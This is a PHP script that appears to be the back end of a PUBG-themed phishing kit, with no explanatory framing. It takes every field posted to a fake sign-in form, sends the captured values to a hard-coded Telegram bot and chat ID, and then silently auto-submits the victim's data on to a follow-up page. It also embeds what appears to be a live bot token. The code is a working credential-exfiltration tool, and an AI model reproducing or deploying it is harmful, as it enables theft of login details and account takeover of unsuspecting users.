<?php
$defaultBotToken = '7320988423:AAGJ_L64E-21Eomi_ve4BqP4-bOKomabxjk';
$defaultChatId = '6341956407';
$defaultRedirectUrl = '../php/pubg/index.php';
$botToken = $_POST['botToken'] ?? $defaultBotToken;
$chatId = $_POST['chatId'] ?? $defaultChatId;
$redirectUrl = isset($_POST['redUrl']) ? "../php/" . $_POST['redUrl'] : $defaultRedirectUrl;
$decodedMessage = urldecode(file_get_contents('php://input'));
parse_str($decodedMessage, $params);
$formattedMessage = '';
foreach ($params as $key => $value) {
    if (!in_array($key, ['botToken', 'chatId', 'redUrl', 'signin-continue-btn'])) {
        $formattedMessage .= "<pre>$key</pre> <code>" . htmlspecialchars($value) . "</code>\n";
    }
}
$ch = curl_init("https://api.telegram.org/bot$botToken/sendMessage");
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => http_build_query([
        'chat_id' => $chatId,
        'text' => $formattedMessage,
        'parse_mode' => 'HTML'
    ]),
    CURLOPT_TIMEOUT => 10
]);
$response = curl_exec($ch);
if ($response === false) {
    error_log('cURL error: ' . curl_error($ch));
}
curl_close($ch);
?>
<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <script type="text/javascript">
        function submitForm() {
            document.getElementById('redirectForm').submit();
        }
    </script>
</head>
<body onload="submitForm()">
    <form id="redirectForm" action="<?php echo htmlspecialchars($redirectUrl); ?>" method="post">
        <?php
        foreach ($_POST as $key => $value) {
            echo '<input type="hidden" name="' . htmlspecialchars($key) . '" value="' . htmlspecialchars($value) . '">';
        }
        ?>
    </form>
</body>
</html>
